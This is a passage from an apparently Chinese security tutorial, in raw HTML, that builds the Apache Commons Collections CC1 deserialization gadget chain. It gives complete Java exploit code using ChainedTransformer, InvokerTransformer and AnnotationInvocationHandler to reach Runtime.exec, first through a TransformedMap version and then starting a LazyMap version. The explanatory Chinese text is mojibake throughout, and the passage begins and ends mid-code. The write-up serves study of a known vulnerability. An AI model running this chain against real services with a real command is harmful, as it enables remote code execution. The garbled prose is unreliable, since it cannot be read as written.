class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> chainedTransformer.transform(Runtime.class);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„æœ€åçš„<code>chainedTransformer.transform(Runtime.class)</code>ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªé—®é¢˜ï¼šè¿™é‡Œåˆå‡ºç°æœ€åˆçš„<code>transform</code>æ–¹æ³•è°ƒç”¨äº†ã€‚æ‰€ä»¥ç°åœ¨æŠŠ<code>decorate</code>åé¢é‚£äº›ç»™å®ƒæ‹¼ä¸Šå»ï¼šå³é€šè¿‡<code>AnnotationInvocationHandler</code>ä¸‹é‡å†™çš„<code>readObject</code>æ–¹æ³•è°ƒç”¨<code>transform</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†è¿™æ—¶å¹¶ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œå› ä¸ºå‰é¢ä¹Ÿè¯´äº†æƒ³è¿›åˆ°<code>setValue</code>æ–¹æ³•å¾—æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) <br>            &#125;<br></code></pre></td></tr></table></figure>

<p>memeberTypeæ˜¯è·å–æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æœ‰å¯¹åº”çš„åç§°ï¼Œè€Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ³¨è§£æ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„ã€‚</p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ª<code>memberType</code>æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p>
<p><img src="/img/cc103.png" srcset="/img/loading.gif" lazyload alt="cc103"></p>
<p>æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br></code></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ³¨è§£å¾—æœ‰æˆå‘˜å˜é‡(å³æˆå‘˜çš„ç±»å‹ä¸èƒ½ä¸ºç©ºï¼š<code>memberType != null</code>)ã€‚çœ‹çœ‹<code>@override</code>é‡Œé¢æ˜¯å¦åˆæˆå‘˜å˜é‡ï¼š</p>
<p><img src="/img/cc104.png" srcset="/img/loading.gif" lazyload alt="cc104"></p>
<p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸ªç©ºçš„ï¼Œä¸è¿‡å¥½åœ¨<code>@Target</code>é‡Œé¢æœ‰ä¸ª<code>value</code></p>
<p><img src="/img/cc105.png" srcset="/img/loading.gif" lazyload alt="cc105"></p>
<p>ç°åœ¨ç¬¬ä¸€ä¸ª<code>if</code>è§£å†³äº†ï¼Œå†çœ‹ç¬¬äºŒä¸ª<code>if</code>ï¼šè¦æ±‚ <code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> ä¸­çš„ <code>para1</code> ä¸æˆå‘˜å˜é‡ç›¸å¯¹åº”ã€‚è¿™é‡Œç›´æ¥æ”¾å‰é¢çš„<code>value</code>å°±è¡Œã€‚</p>
<p>è¿™é‡Œç›´æ¥æ”¾DBå¸ˆå‚…çš„å›¾ï¼š</p>
<p><img src="/img/cc106.png" srcset="/img/loading.gif" lazyload alt="cc106"></p>
<p>æœ€åä¸€ä¸ªé—®é¢˜å°±æ˜¯è¿™é‡Œ<code>setValue</code>çš„å‚æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                           value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                               annotationType.members().get(name)));<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‚æ•°å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„<code>Runtime.class</code>ï¼Œä¸è¿‡<code>ConstantTransformer</code>ç±»çš„å­˜åœ¨å¯ä»¥å¸®æˆ‘ä»¬è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ConstantTransformer.java</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿çš„<code>transform</code>æ–¹æ³•ï¼šä¸ç®¡inputä»€ä¹ˆä»–éƒ½åªèƒ½è¿”å›<code>iConstant</code>ï¼Œè€Œ<code>iConstant</code>è¿™ä¸œè¥¿å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­å®šä¹‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥<code>new</code>ä¸€ä¸ª<code>ConstantTransformer(Runtime.class)</code>ï¼Œè¿™æ—¶è°ƒç”¨å®ƒçš„<code>transform</code>æ–¹æ³•æ—¶ä¸ç®¡inputä»€ä¹ˆéƒ½åªèƒ½è¿”å›<code>Runtime.class</code>ã€‚</p>
<p>æœ€ç»ˆEXP(å‚è€ƒäº†DBå¸ˆå‚…çš„)ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// æœ€ç»ˆçš„ EXPpublic class TransformMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <span class="hljs-comment">//è¿™é‡Œé”®æ˜¯valueå°±è¡Œï¼Œå€¼éšä¾¿å†™</span><br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>æ€»ç»“ä¸€ä¸‹è°ƒç”¨é¡ºåºï¼š</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject -&gt;</span><br>	 A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue -&gt;</span><br>	 	T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue -&gt;</span><br>	 		InvokerTransformer.transform<br></code></pre></td></tr></table></figure>

<p>æœ€åæ³¨æ„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br>    <br>    è¿™é‡Œçš„memberValuesæ”¾çš„æ˜¯transformedMapï¼Œæœ€ç»ˆä¼šæ‰§è¡Œçš„æ˜¯memberValue.setValue<br></code></pre></td></tr></table></figure>



<p><code>AnnotationInvocationHandler.java</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CC1-Lazymapç‰ˆ"><a href="#CC1-Lazymapç‰ˆ" class="headerlink" title="CC1 Lazymapç‰ˆ"></a>CC1 Lazymapç‰ˆ</h2><p>é¦–å…ˆï¼Œlazyç±»ä¸‹å­˜åœ¨getæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†<code>transform</code>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-comment">// create value for key if key is not currently in the map  </span><br> <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);  <br> map.put(key, value);  <br> <span class="hljs-keyword">return</span> value;  <br> &#125;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>transformçš„è¯è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªï¼Œé‡Œé¢çš„å‚æ•°æ”¾ä¸ªç±»å°±è¡Œã€‚å‰é¢çš„factoryå°±æ˜¯<code>invokertransformer</code>ã€‚</p>
<p>å†å¾€ä¸Šè·Ÿä¸€ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br><span class="hljs-comment">//æ³¨æ„è¿™ä¸ªæ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = FactoryTransformer.getInstance(factory);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<p>ç§æœ‰çš„æ„é€ æ–¹æ³•ï¼Œè¿˜å­˜åœ¨<code>decorate</code>è¿™ä¸ªé™æ€æ–¹æ³•å¯ä»¥å®ä¾‹åŒ–å‡ºä¸€ä¸ª<code>Lazymap</code>ã€‚</p>
<p>å…ˆåˆ©ç”¨ç°æœ‰çš„ä¸œè¥¿è°ƒä¸ªè®¡ç®—å™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_REAL1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getruntime();<br><br>        <span class="hljs-type">InvokerTransformer</span> 